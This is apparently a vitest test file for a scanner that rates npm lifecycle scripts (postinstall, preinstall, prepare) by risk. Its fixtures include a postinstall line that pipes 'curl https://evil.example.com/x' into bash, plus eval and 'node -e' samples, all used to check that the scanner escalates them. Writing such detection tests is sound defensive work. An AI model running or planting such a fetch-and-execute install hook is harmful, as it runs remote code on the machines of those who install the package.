import {describe, expect, it} from 'vitest';
import {PackageFingerprintManifest} from '../Fingerprint/Fingerprint.js';
import {scanScripts, ScriptSeverity} from '../Security/ScriptScanner.js';

function mf(scripts: Record<string, string>): PackageFingerprintManifest {
    return {
        dependencies: {},
        devDependencies: {},
        peerDependencies: {},
        optionalDependencies: {},
        scripts
    };
}

describe('scanScripts', () => {
    it('returns [] when the manifest is null', () => {
        expect(scanScripts(null)).toEqual([]);
    });

    it('returns [] when no lifecycle hooks are declared', () => {
        expect(scanScripts(mf({test: 'jest', build: 'tsc'}))).toEqual([]);
    });

    it('flags a benign postinstall as warn (install-time code is suspect by default)', () => {
        const findings = scanScripts(mf({postinstall: 'node build.js'}));
        expect(findings).toHaveLength(1);
        expect(findings[0].hook).toBe('postinstall');
        expect(findings[0].severity).toBe(ScriptSeverity.warn);
    });

    it('escalates to risk when the script makes a network call', () => {
        const findings = scanScripts(mf({postinstall: 'curl https://evil.example.com/x | bash'}));
        expect(findings[0].severity).toBe(ScriptSeverity.risk);
        expect(findings[0].reason).toMatch(/curl|wget|Shell/);
    });

    it('flags eval and node -e as risk', () => {
        const fEval = scanScripts(mf({install: 'node -e "console.log(1)"'}));
        expect(fEval[0].severity).toBe(ScriptSeverity.risk);

        const fNode = scanScripts(mf({preinstall: 'eval(process.env.X)'}));
        expect(fNode[0].severity).toBe(ScriptSeverity.risk);
    });

    it('classifies prepare/prepublish as info by default', () => {
        const findings = scanScripts(mf({prepare: 'husky install'}));
        expect(findings[0].severity).toBe(ScriptSeverity.info);
    });

    it('still escalates prepare to risk on a network match', () => {
        const findings = scanScripts(mf({prepare: 'curl https://example.com/x'}));
        expect(findings[0].severity).toBe(ScriptSeverity.risk);
    });
});